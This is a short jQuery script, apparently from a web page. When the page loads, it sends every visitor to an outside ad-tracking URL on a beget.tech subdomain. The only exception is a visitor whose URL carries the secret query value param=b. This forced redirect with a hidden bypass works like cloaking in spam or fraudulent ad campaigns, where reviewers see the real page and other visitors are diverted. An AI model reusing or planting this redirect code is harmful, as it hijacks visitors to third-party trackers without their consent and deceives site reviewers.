$( document ).ready(function() {
	var param;
    function getUrlVars()
	{
	    var vars = [], hash;
	    var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
	    for(var i = 0; i < hashes.length; i++)
	    {
	        hash = hashes[i].split('=');
	        vars.push(hash[0]);
	        vars[hash[0]] = hash[1];
	    }
	    if(vars.param == "b") {
	    	return;
	    }
	    else (
	    	window.location.href = "http://tracker.xkuklohd.beget.tech/track/los-pollos-bez-uvoda/source/campaign-ads"
	    )    
	}
	getUrlVars();
});